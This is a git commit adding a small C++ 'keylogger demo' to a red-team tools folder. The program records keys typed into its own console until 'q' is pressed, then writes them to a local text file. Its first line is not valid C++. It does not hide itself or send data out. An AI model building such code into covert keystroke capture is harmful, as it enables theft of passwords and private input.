0ce718ce16effff55ff7766b0f90629f6dd0d1fd
lianmark <63747960+lianmark@users.noreply.github.com>
2025-10-15 22:47:47 +0300

    Add keylogger demo in keyloggerDEMO.cpp
    This program captures keystrokes and logs them to a file until the 'q' key is pressed.

---
+++ red-team-tools/C++/keyloggerDEMO.cpp
@@ -0,0 +1,35 @@
+# JFF project
+#include <cstdio>
+#include <conio.h>
+#include <list>
+#include <fstream> 
+#include <iostream> 
+using namespace std;
+
+int main(){
+    list<char> mylist;
+    while(true)
+    {
+        char key = _getch();
+        printf("You pressed %c\n ", key);
+        mylist.push_back(key);
+        if(key == 'q')
+        {
+            break;
+        }
+    };
+
+    ofstream filetxt("testkeylogger.txt");
+    if(filetxt.is_open()){
+        for(auto n = mylist.begin(); n != mylist.end(); ++n)
+    {
+        filetxt << *n;
+        if(*n == ' '){ filetxt << endl;}
+    } 
+
+    }
+    else{
+        cerr << "error"; 
+    }
+    filetxt.close();
+}
